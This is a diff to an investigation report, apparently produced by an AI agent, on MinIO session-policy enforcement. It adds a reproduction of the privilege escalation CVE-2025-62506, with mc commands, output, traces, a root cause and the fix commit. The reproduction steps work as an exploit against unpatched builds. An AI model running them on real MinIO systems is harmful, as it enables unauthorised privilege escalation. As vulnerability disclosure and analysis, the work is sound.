@@ -1793,13 +1793,15 @@ This GET, too, produced 0 new server-log lines.
 
 ### Direct Answer
 
-**[Observed]** Temporary credentials issued by STS `AssumeRole` are constrained to the **intersection** of the parent user's policy and the inline session policy — the session policy can only *narrow*, never *widen*, the parent's permissions. Proven with a single, fully correlated session:
+**[Observed]** For **direct S3 action authorization**, temporary credentials issued by STS `AssumeRole` are constrained to the **intersection** of the parent user's policy and the inline session policy: on the direct request path the session policy can only *narrow*, never *widen*, the parent's permissions (evaluated by `IAMSys.IsAllowedSTS` → `isAllowedBySessionPolicy`, `cmd/iam.go:2242`/`:2310-2312`). Proven with a single, fully correlated session:
 
 - The parent user `r4parentuser` (a non-admin) has a broad policy allowing **both** `s3:GetObject` and `s3:PutObject`; with its long-term credentials, both a GET and a PUT succeed (HTTP 200).
 - One `AssumeRole` call, carrying an inline session policy that allows **only** `s3:GetObject`, returns one temporary credential — `AccessKeyId = MYLCK9PTJE73DS0ADU0Y`. The session token is a JWT whose decoded **`accessKey` claim equals that same `MYLCK9PTJE73DS0ADU0Y`** and whose `parent` claim is `r4parentuser`.
 - Using that one temporary credential: **GetObject succeeds (200)** — allowed by both parent and session — while **PutObject is denied with `403 AccessDenied`** — allowed by the parent but omitted from the session policy. Both S3 requests are signed with the identical temporary `AccessKeyId`.
 
-Thus MinIO **does** enforce the session policy: the parent-allowed-but-session-omitted action (`PutObject`) is refused, demonstrating the intersection. Additionally, an inline session policy larger than 2,048 bytes is rejected at issuance (`400 InvalidParameterValue`).
+Thus MinIO **does** enforce the session policy on the direct S3 request path: the parent-allowed-but-session-omitted action (`PutObject`) is refused, demonstrating the intersection. Additionally, an inline session policy larger than 2,048 bytes is rejected at issuance (`400 InvalidParameterValue`).
+
+> **⚠️ Scope of this guarantee — the narrowing is _not_ absolute on this build.** The intersection above governs **direct** S3/admin action authorization for the scoped credential. It does **not** cover one **own-account** administrative operation: on the checked-out HEAD (base `c07e5b49d`, built `2024-11-25`), a session-policy-restricted credential can **re-widen back to its parent's full permissions** by creating a **new service account for its own parent** — a runtime-reproducible privilege escalation (**CVE-2025-62506 / GHSA-jjjj-jwhf-8rgr**). The "narrow, never widen" property therefore holds for the direct request path shown here but is **defeated** by this indirect path on this version. This is demonstrated with captured runtime output, root-caused to the specific function and `file:line`, and version-scoped in **"Known Session-Policy Bypass on This Build — CVE-2025-62506"** below. Per the run-first / honesty rule, the weakness is disclosed here rather than omitted.
 
 ### Reproduction
 
@@ -2105,6 +2107,261 @@ ASSUMEROLE -> ERROR ClientError
 ### Rationale
 
 **[Observed] + [Source-grounded]** The `return isAllowedSP && (… combinedPolicy.IsAllowed(args))` at `cmd/iam.go:2312` is the intersection: a request is allowed only if **both** the inline session policy (`isAllowedSP`) **and** the parent/combined policy allow it. `PutObject` is allowed by the parent (baseline PUT → 200) but is absent from the session policy, so `isAllowedSP` is false and the temporary credential's PUT is denied (`403 AccessDenied`); `GetObject` is present in both, so it succeeds (200). Because `JWTSignWithAccessKey` (`credentials.go:340`) stamps the JWT `accessKey` claim with the credential's own access key, the issued `AccessKeyId`, the token's identity claim, and the `Credential=` of both S3 requests are necessarily the same value (`MYLCK9PTJE73DS0ADU0Y`) — a single credential exercised end-to-end, not a splice of separate sessions. The 2,048-byte cap (`sts-handlers.go:123-124`) further bounds how large an inline session policy may be.
+
+### Known Session-Policy Bypass on This Build — CVE-2025-62506 (own-account service-account creation)
+
+> **Direct answer.** **[Observed]** The "narrow, never widen" property proven above holds only for **direct** S3/admin action authorization. On the checked-out HEAD it is **defeated** by one **own-account** administrative path: a credential whose inline session policy grants *only* `s3:GetObject` — and is therefore denied `PutObject`/`DeleteObject` directly — can **create a new service account for its own parent user**, and that new account is issued with **no** session policy (`Policy: implied`), so it inherits the **parent's full policy** and can `PutObject`/`DeleteObject` again. The restricted credential thus **re-widens back to the parent's entire permission set**. This is the published vulnerability **CVE-2025-62506 / GHSA-jjjj-jwhf-8rgr** ("Privilege Escalation via Session Policy Bypass in Service Accounts and STS", CVSS 8.1 High, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`, CWE-863), which affects all MinIO versions **before** `RELEASE.2025-10-15T17-29-55Z`. The build under investigation predates the fix (see *Version position* below), so the bypass reproduces here. It is reported per the honesty rule; **no source file was modified** — this is an observed, version-scoped weakness of the deliverable's build, not a change to it.
+
+This section was reproduced on a **dedicated, isolated single-drive instance** (endpoint `http://127.0.0.1:9300`, data dir `/tmp/qa_cve62506/data`, torn down afterward) so it does not perturb the other requirements' fixtures. All access keys shown are non-secret identifiers; secret keys and session tokens are redacted (ephemeral, torn down).
+
+#### Reproduction
+
+The parent `escparent` is a **non-admin** user with a broad-but-non-administrative S3 policy `escparentpol` (so a denial is meaningful and no `admin:*` action is present):
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": ["s3:GetObject", "s3:PutObject", "s3:DeleteObject", "s3:ListBucket"],
+      "Resource": ["arn:aws:s3:::escbucket", "arn:aws:s3:::escbucket/*"]
+    }
+  ]
+}
+```
+
+Restricted child session policy `child_getonly.json` (**GetObject only** — no Put, no Delete, no admin action):
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": ["s3:GetObject"],
+      "Resource": ["arn:aws:s3:::escbucket/*"]
+    }
+  ]
+}
+```
+
+Control child session policy `child_denysvc.json` (GetObject **plus an explicit `Deny` of `admin:CreateServiceAccount`**; an admin-action statement carries no `Resource`):
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    { "Effect": "Allow", "Action": ["s3:GetObject"], "Resource": ["arn:aws:s3:::escbucket/*"] },
+    { "Effect": "Deny",  "Action": ["admin:CreateServiceAccount"] }
+  ]
+}
+```
+
+Setup (signed as root, `qa` alias):
+
+```bash
+mc mb -p qa/escbucket
+printf 'parent-seed-object-body' | mc pipe qa/escbucket/seedobj
+mc admin policy create qa escparentpol pol/parent.json
+mc admin user add qa escparent <REDACTED_USER_SECRET>
+mc admin policy attach qa escparentpol --user escparent
+# restricted child service account (session policy = GetObject only)
+mc admin user svcacct add qa escparent --access-key ESCCHILDKEY00000001 \
+   --secret-key <REDACTED_SECRET> --policy pol/child_getonly.json
+# control child (session policy explicitly denies admin:CreateServiceAccount)
+mc admin user svcacct add qa escparent --access-key ESCDENYKEY000000001 \
+   --secret-key <REDACTED_SECRET> --policy pol/child_denysvc.json
+# alias authenticated AS the restricted child, and AS the control child
+mc alias set qachild http://127.0.0.1:9300 ESCCHILDKEY00000001 <REDACTED_SECRET>
+mc alias set qadeny  http://127.0.0.1:9300 ESCDENYKEY000000001 <REDACTED_SECRET>
+```
+
+The S3 probe `s3op.py` is a boto3 SigV4 client (`get`/`put`/`delete` against `escbucket/seedobj`), used to show byte-accurate status codes for each credential.
+
+#### Observed output — Variant A (restricted **service account** child)
+
+**Baseline: the restricted child is genuinely narrowed on the direct path. [Observed]** GET is allowed by the session policy; PUT and DELETE are allowed by the parent but omitted from the session policy, so both are denied:
+
+```bash
+python3 s3op.py get    ESCCHILDKEY00000001 <REDACTED_SECRET>
+python3 s3op.py put    ESCCHILDKEY00000001 <REDACTED_SECRET>
+python3 s3op.py delete ESCCHILDKEY00000001 <REDACTED_SECRET>
+```
+
+```
+GetObject -> HTTP 200 body= parent-seed-object-body
+put -> ERROR AccessDenied
+  Code= AccessDenied HTTP= 403
+delete -> ERROR AccessDenied
+  Code= AccessDenied HTTP= 403
+```
+
+**Exploit: the restricted child creates a service account for its own parent. [Observed]** The command is signed **as the restricted child** (`qachild`) and **succeeds** (exit 0); the new account has `Policy: implied` (no session policy → inherits the full parent policy):
+
+```bash
+mc admin user svcacct add qachild escparent \
+   --access-key ESCGRANDKEY0000002 --secret-key <REDACTED_SECRET>
+echo "exit=$?"
+mc admin user svcacct info qa ESCGRANDKEY0000002
+```
+
+```
+Access Key: ESCGRANDKEY0000002
+Secret Key: <REDACTED_SECRET>
+Expiration: no-expiry
+exit=0
+AccessKey: ESCGRANDKEY0000002
+ParentUser: escparent
+Policy: implied
+```
+
+**Escalation confirmed: the new account exercises the parent's full scope. [Observed]** `PutObject` (200) and `DeleteObject` (204) now succeed — the exact actions denied to the restricted child that minted this account:
+
+```bash
+python3 s3op.py get    ESCGRANDKEY0000002 <REDACTED_SECRET>
+python3 s3op.py put    ESCGRANDKEY0000002 <REDACTED_SECRET>
+python3 s3op.py delete ESCGRANDKEY0000002 <REDACTED_SECRET>
+```
+
+```
+GetObject -> HTTP 200 body= parent-seed-object-body
+PutObject -> HTTP 200
+DeleteObject -> HTTP 204
+```
+
+**Impact is bounded to the parent's scope — not `consoleAdmin`. [Observed]** The minted account inherits only the parent's (non-admin) S3 policy, so an admin call is refused; the escalation is a *scope escape back to the parent*, not a promotion to console admin:
+
+```bash
+mc admin info qagrand    # qagrand aliased to ESCGRANDKEY0000002
+```
+
+```
+mc: <ERROR> Unable to get service info. Access Denied.
+```
+
+**Control: an explicit `Deny` of `admin:CreateServiceAccount` blocks the escalation. [Observed]** With the *only* change being an explicit session-policy `Deny` of the admin action, the identical own-parent creation is refused (`Access Denied`, exit 1) and no key is created — isolating the cause to the deny-vs-omit distinction:
+
+```bash
+mc admin user svcacct add qadeny escparent \
+   --access-key ESCFAILKEY000000002 --secret-key <REDACTED_SECRET>
+echo "exit=$?"
+```
+
+```
+mc: <ERROR> Unable to add a new service account. Access Denied.
+exit=1
+```
+
+**Server trace attribution (`mc admin trace --all --verbose qa`). [Observed]** The escalating `admin.AddServiceAccount` is signed by the **restricted child** and returns `200 OK`; the subsequent `s3.PutObject` is signed by the **minted account** and returns `200 OK`:
+
+```
+127.0.0.1:9300 [REQUEST admin.AddServiceAccount] [2026-07-15T02:03:44.873] [Client IP: 127.0.0.1]
+127.0.0.1:9300 PUT /minio/admin/v3/add-service-account
+127.0.0.1:9300 Proto: HTTP/1.1
+127.0.0.1:9300 Host: 127.0.0.1:9300
+127.0.0.1:9300 X-Amz-Date: 20260715T020344Z
+127.0.0.1:9300 Accept-Encoding: zstd,gzip
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCCHILDKEY00000001/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=0f8a6128ab8ef20579967bb9adc08c7e88181f019d8710f329167b7dbcaf3543
+127.0.0.1:9300 Content-Length: 152
+127.0.0.1:9300 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z
+127.0.0.1:9300 X-Amz-Content-Sha256: f77b047ef7b44ce4da65808dbe2784897d64f0856841b7c36d1de39ad88d6138
+127.0.0.1:9300 <BLOB>
+127.0.0.1:9300 [RESPONSE] [2026-07-15T02:03:44.920] [ Duration 47.091ms TTFB 47.082123ms ↑ 245 B  ↓ 179 B ]
+127.0.0.1:9300 200 OK
+```
+
+```
+127.0.0.1:9300 [REQUEST s3.PutObject] [2026-07-15T02:03:45.346] [Client IP: 127.0.0.1]
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCGRANDKEY0000002/20260715/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-crc32;x-amz-content-sha256;x-amz-date;x-amz-sdk-checksum-algorithm, Signature=a9849a9765d7fbadeed8d2142125e8894267094e91b6531cdbe960026fa397e9
+127.0.0.1:9300 [RESPONSE] [2026-07-15T02:03:45.371] [ Duration 24.68ms TTFB 24.647333ms ↑ 204 B  ↓ 0 B ]
+127.0.0.1:9300 200 OK
+```
+
+The control's `admin.AddServiceAccount`, signed by the deny-child, is refused with `403 Forbidden`:
+
+```
+127.0.0.1:9300 [REQUEST admin.AddServiceAccount] [2026-07-15T02:03:45.491] [Client IP: 127.0.0.1]
+127.0.0.1:9300 PUT /minio/admin/v3/add-service-account
+127.0.0.1:9300 Proto: HTTP/1.1
+127.0.0.1:9300 Host: 127.0.0.1:9300
+127.0.0.1:9300 Authorization: AWS4-HMAC-SHA256 Credential=ESCDENYKEY000000001/20260715//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=ffb1569a584d0a9d33abc381975a5b23b40816d1eedd6f0f6c63253616360320
+127.0.0.1:9300 Content-Length: 152
+127.0.0.1:9300 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z
+127.0.0.1:9300 X-Amz-Content-Sha256: ca7ea66ffcd24b38afff728fd8d65451e0879a013884f0358a6b959b7d9ac11a
+127.0.0.1:9300 X-Amz-Date: 20260715T020345Z
+127.0.0.1:9300 Accept-Encoding: zstd,gzip
+127.0.0.1:9300 <BLOB>
+127.0.0.1:9300 [RESPONSE] [2026-07-15T02:03:45.512] [ Duration 21.234ms TTFB 21.228088ms ↑ 245 B  ↓ 207 B ]
+127.0.0.1:9300 403 Forbidden
+```
+
+#### Observed output — Variant B (restricted **STS** temporary credential)
+
+The vulnerability is not specific to service accounts; an STS `AssumeRole` credential with the same GetObject-only session policy behaves identically. `AssumeRole` returns a temporary credential (`HWKXAVYPUBFKT11ZE31T`); direct GET is allowed (200) and direct PUT denied (403), yet the temporary credential can still create a service account for its own parent (`Policy: implied`), which then PUTs successfully (200):
+
+```
+ASSUMEROLE_HTTP=200
+TEMP_AK=HWKXAVYPUBFKT11ZE31T           (secret + session token redacted — ephemeral 900s)
+TEMP GetObject -> HTTP 200 body= parent-seed-object-body
+TEMP PutObject -> ERROR AccessDenied   Code= AccessDenied HTTP= 403
+# exploit: STS temp cred (with X-Amz-Security-Token) creates svcacct for own parent
+Access Key: STSGRANDKEY0000001
+Secret Key: <REDACTED_SECRET>
+Expiration: no-expiry
+AccessKey: STSGRANDKEY0000001
+ParentUser: escparent
+Policy: implied
+PutObject -> HTTP 200
+```
+
+**Stability. [Observed]** Both variants were run twice with identical results (the trace above is from the second run); the outcome is stable, not timing-dependent.
+
+#### Root cause
+
+**[Source-grounded] + [Observed]** The escalation is authorized inside `commonAddServiceAccount` (`cmd/admin-handlers-users.go:2714`; reached from `AddServiceAccount`, `:650`). When the *target* of the create is the caller's own parent, a `denyOnly` flag is set true at `cmd/admin-handlers-users.go:2781`:
+
+```go
+denyOnly := (targetUser == cred.AccessKey || targetUser == cred.ParentUser)
+```
+
+and the authorization check passes that flag through as `policy.Args.DenyOnly` (the comment states the intent: *allowed if creating for another user; only checked for explicit deny if for self*):
+
+```go
+// Check if action is allowed if creating access key for another user
+// Check if action is explicitly denied if for self
+if !globalIAMSys.IsAllowed(policy.Args{
+    AccountName: cred.AccessKey, Groups: cred.Groups,
+    Action:      policy.CreateServiceAccountAdminAction,
+    ConditionValues: condValues, IsOwner: owner, Claims: cred.Claims,
+    DenyOnly:    denyOnly,          // <-- true for own-account creation
+}) { return ..., errorCodes.ToAPIErr(ErrAccessDenied) }
+```
+
+`IAMSys.IsAllowed` (`cmd/iam.go:2437`) dispatches by credential type — `:2458` → `IsAllowedSTS` for temporary creds, `:2467` → `IsAllowedServiceAccount` for service accounts. Both consult the inline session policy through helpers that, **on this HEAD, fail to reset `DenyOnly` before evaluating the sub-policy**:
+
+- `isAllowedBySessionPolicyForServiceAccount` (`cmd/iam.go:2320`) and `isAllowedBySessionPolicy` (`cmd/iam.go:2381`) each do `sessionPolicyArgs := args; sessionPolicyArgs.IsOwner = false; return hasSessionPolicy, subPolicy.IsAllowed(sessionPolicyArgs)` — copying the caller's `DenyOnly = true` into the sub-policy evaluation.
+
+The propagated flag then short-circuits the sub-policy check in the external policy package `github.com/minio/pkg/v3@v3.0.22/policy/policy.go`, `func (Policy) IsAllowed` (`:173`): after confirming no explicit `Deny` matches (`:174-182`), it returns **`true`** at `:188`:
+
+```go
+if args.DenyOnly {
+    return true
+}
+```
+
+Because the GetObject-only session policy contains **no explicit `Deny`** of `admin:CreateServiceAccount`, `isAllowedSP` evaluates to `true`, the parent/combined policy likewise does not deny it, and the own-parent service-account creation is authorized — even though the session policy never **allowed** any admin action. The **control** proves this precisely: adding an explicit `Deny admin:CreateServiceAccount` makes the `:174-182` deny check fire and return `false` before the `:188` short-circuit, so the identical request is refused (`403`). In short, for own-account operations the sub-policy is evaluated in "deny-only" mode (*is it explicitly forbidden?*) instead of "allow" mode (*is it explicitly permitted?*), which is exactly the flaw the advisory describes.
+
+#### Version position and remediation
+
+**[Observed]** The upstream fix is commit `c1a49490c78e9c3ebcad86ba0662319138ace190` ("fix: check sub-policy properly when present", PR minio/minio#21642, 2025-10-15), released in `RELEASE.2025-10-15T17-29-55Z`. Verified against the checked-out repository, that commit is **not** an ancestor of this build's HEAD:
+
+```bash
+git merge-base --is-ancestor c1a49490c78e9c3ebcad86ba0662319138ace190 HEAD && echo ANCESTOR || echo NOT-ANCESTOR
+# -> NOT-ANCESTOR  (fix absent; this build predates it)
+```
+
+The fix adds a single corrective line — `sessionPolicyArgs.DenyOnly = false` — to **both** `isAllowedBySessionPolicyForServiceAccount` and `isAllowedBySessionPolicy`, with the explanatory comment: *"DenyOnly is used only for allowing an account to do actions related to its own account (like create service accounts for itself…). However when a session policy is present, we need to validate that the action is actually allowed, rather than checking if the action is only disallowed."* That is, after the fix the sub-policy is always evaluated in allow mode, so a session policy that merely omits `admin:CreateServiceAccount` no longer passes — closing the bypass. **Remediating the code is out of scope for this read-only investigation (MainRule); this section documents the observed behavior and its root cause only.**
 
 ---
 
@@ -2627,6 +2884,7 @@ Every named item and variant across R1–R5 was exercised at runtime through the
 | R4 | Temp-cred `GetObject` (session allows) | PASS | Observed | `200`, body `r4-seed-object-body` |
 | R4 | Temp-cred `PutObject` (parent allows, session omits) | PASS | Observed | `403 AccessDenied` (intersection proven; same key end-to-end) |
 | R4 | Inline session-policy size cap (2,048 bytes) | PASS | Observed + Source-grounded | 2,230-byte policy → `400 InvalidParameterValue` "Session policy should not exceed 2048 characters" (`sts-handlers.go:89`,`:123-124`) |
+| R4 | Session-policy bypass via own-account service-account creation (CVE-2025-62506) | OBSERVED WEAKNESS (disclosed) | Observed + Source-grounded | GetObject-only child (svcacct **and** STS) creates svcacct for its own parent → `Policy: implied` → parent-scope `PutObject 200`/`DeleteObject 204` restored; explicit-`Deny` control → `403`; pre-fix HEAD (root cause: `DenyOnly` not reset in `cmd/iam.go:2320`/`:2381`; short-circuit `policy.go:188`) |
 | R5 | Self-attach `consoleAdmin` via `SetPolicyForUserOrGroup` | PASS | Observed | `403 AccessDenied`; authenticated audit `accessKey=r5basic` (reached `IsAllowed`) |
 | R5 | Self-attach `consoleAdmin` via `AttachDetachPolicyBuiltin` | PASS | Observed | `403 AccessDenied`; authenticated audit `accessKey=r5basic` |
 | R5 | Mapping unchanged after attempts | PASS | Observed | `r5basic` → only `r5basicpolicy`; `consoleAdmin` has no user mappings |
